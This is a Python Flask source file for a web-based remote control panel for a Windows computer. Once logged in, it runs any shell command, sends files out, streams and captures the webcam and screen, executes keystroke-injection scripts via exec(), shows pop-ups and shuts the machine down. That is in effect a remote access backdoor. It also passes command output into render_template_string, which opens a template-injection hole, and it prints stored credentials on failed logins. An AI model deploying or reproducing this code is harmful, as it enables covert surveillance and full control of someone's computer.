import os
import json
import subprocess as sp
from utils import (gen_frames, save_selphie, save_screenshot,
                   to_base64, tmpname, gen_screenshots,
                   msgbox_alert, start_new_thread, Mbox,
                   pg)

from flask import (Flask, render_template, request, 
                   redirect, render_template_string, send_file,
                   send_from_directory, Response, flash)

from flask_login import (LoginManager, UserMixin, login_user, 
                         logout_user, current_user, login_required)

from ducky2python import toducky



app = Flask(__name__, static_folder="static")
var = json.load(open("config/secrets.json","r"))

app.secret_key = to_base64(var["secret_key"])

# Configure Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)

# Define a User model
class User(UserMixin):
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def get_id(self):
        return self.username


user = User(var["username"], var["password"])
    
@login_manager.user_loader
def load_user(user_id):
    return user if user.get_id() == user_id else None@login_manager.user_loader
def load_user(user_id):
    return user if user.get_id() == user_id else None

shell_template = open("templates/shell.html").read()
tmpdir = os.path.abspath("temporary files")

for file in os.listdir("temporary files"):
    os.remove(r"temporary files/"+file)


custom_help = """
:download <filename>

:webcam_stream
:webcam_download / :selphie

:screen_stream
:screenshot / :screen

:msgbox
"""

@app.route("/", methods=['POST', 'GET'])
def homepage():
    if request.method == "POST":
        username = request.form.get("username_input")
        password = request.form.get("password_input")
        print(username)
        print(password)
        if to_base64(username) == user.username and to_base64(password) == user.password:
            login_user(user)
            return redirect("shell")
        else:
            print(f"Credentials\n{to_base64(username)}:{to_base64(password)}")
            print(f"{var['username']}:{var['password']}")
            #return "<script>alert('Invalid Credentials.'); history.back()</script>"
            flash("Invalid Credentials.")
            return redirect("/")
    return render_template("index.html")


@app.route("/screen_feed")
@login_required
def screen_feed():
    return Response(gen_screenshots(), 
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route("/ducky_script",methods=["GET","POST"])
@login_required
def ducky_script():
    if request.method == "POST":
        script = request.form.get("script")
        print(script)
        exec(toducky(script))
    return render_template("ducky.html")


@app.route("/video_feed")
@login_required
def video_feed():
    return Response(gen_frames(), 
                    mimetype='multipart/x-mixed-replace; boundary=frame')


@app.route("/msgbox_creator", methods=["GET", "POST"])
@login_required
def msgbox_creator():
    print(f"MSGBOX_CREATOR: {request.form}")
    if request.method == "POST":
        title = request.form.get("title")
        body = request.form.get("body")
        buttons = request.form.get("buttons")
        type_ = request.form.get("type")

        if type_ == "tkinter":
            start_new_thread(msgbox_alert, args=(body, title, buttons.split(";")))
        
        elif type_ == "winapi":
            if buttons.isdigit():
                start_new_thread(Mbox, (title, body, int(buttons)))
            else:
                flash("If WinApi is selected, type must be int.")
                return redirect("msgbox_creator")

    return render_template("pymsgboxcreator.html")


shutdown_abspath = os.path.abspath("static/shutdown.png")
print(shutdown_abspath)

@app.route("/shell", methods=['POST', 'GET'])
@login_required
def shell():
    print(f"SHELL: {request.form}")

    cmd = request.form.get("input_cmd")
    shutdown_button_pressed = request.form.get("shutdown_button") == "shutdown_button"
    cancel_button_pressed = request.form.get("cancel_shutdown_button") == "cancel_shutdown_button"
    msgbox_creator_pressed = request.form.get("pop-up") == "pop-up"
    ducky_pressed = request.form.get("ducky") == "ducky"
    download_screenshot_pressed = request.form.get("download_screenshot") == "download_screenshot"
    download_pic_pressed = request.form.get("download_pic") == "download_pic"
    webcam_stream_pressed = request.form.get("webcam_stream") == "webcam_stream"
    screen_stream_pressed = request.form.get("screen_stream") == "screen_stream"

    if msgbox_creator_pressed:
        return '<script>window.open("/msgbox_creator", "_blank");history.back()</script>'

    if shutdown_button_pressed:
        os.system("shutdown -s -t 11")
        flash("Shutting down the machine in 10 seconds")
        return redirect("shell")
    
    if cancel_button_pressed:
        os.system("shutdown -a")
        flash("Shutting down canceled")
        return redirect("shell")
    
    if ducky_pressed:
        return redirect("ducky_script")

    if request.method == "POST" and cmd is not None:
        if cmd.startswith("cd") and len(cmd) > 3:
            destdir = cmd[3:]
            if os.path.exists(destdir):
                os.chdir(destdir)
                output = b""
            else:
                output = sp.run(cmd, shell=True, stdout=sp.PIPE, stderr=sp.PIPE).stderr

        elif cmd == "cd" or cmd == "cd %USERPROFILE%":
            os.chdir(os.getenv("USERPROFILE"))
            output = b""

        elif cmd == ":msgbox":
            return '<script>window.open("/msgbox_creator", "_blank");history.back()</script>'

        elif cmd.startswith(":help"):
            output = custom_help


        elif cmd.startswith(":download"):
            filename = cmd.replace(":download ", "")
            if os.path.exists(filename) and os.path.isfile(filename):
                return send_file(path_or_file=os.path.abspath(filename), as_attachment=True)
            
            elif os.path.exists(filename) and os.path.isdir(filename):
                flash("You can't download a folder")
                return redirect("shell")
            
            else:
                print(f"Filename:<{filename}>")
            output = ""

        elif cmd == ":screen_stream" or screen_stream_pressed:
            output = ""
            return '<script>window.open("/screen_feed", "_blank");history.back()</script>'

        elif cmd == ":webcam_stream" or webcam_stream_pressed:
            output = ""
            return '<script>window.open("/video_feed", "_blank");history.back()</script>'


        elif cmd == ":screenshot" or cmd == ":screen" or download_screenshot_pressed:
            filename = tmpname()
            output = ""
            save_screenshot(tmpdir+"\\"+filename)
            return send_file(tmpdir+"\\"+filename, as_attachment=True)

        elif cmd == ":webcam_download" or cmd == ":selphie" or download_pic_pressed:
            filename = tmpname()
            output = ""
            save_selphie(tmpdir+"\\"+filename)
            return send_file(tmpdir+"\\"+filename, as_attachment=True)
        

        else:
            try:
                scmd = sp.run(cmd, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, timeout=3)
            except sp.TimeoutExpired:
                output = "Timeout error."
            else:
                if scmd.returncode:
                    output = scmd.stderr
                else:
                    output = scmd.stdout

        if type(output) == bytes:
            output = output.decode("cp850")

        template_output = shell_template.replace("{output_square_text}", output)
        template_path = template_output.replace("{path}", os.getcwd()+"> ")
        return render_template_string(template_path)

    template_output = shell_template.replace("{output_square_text}", "")
    template_path = template_output.replace("{path}", os.getcwd()+"> ")
    return render_template_string(template_path, shutdown_path=shutdown_abspath)


if __name__ == "__main__":
    app.run()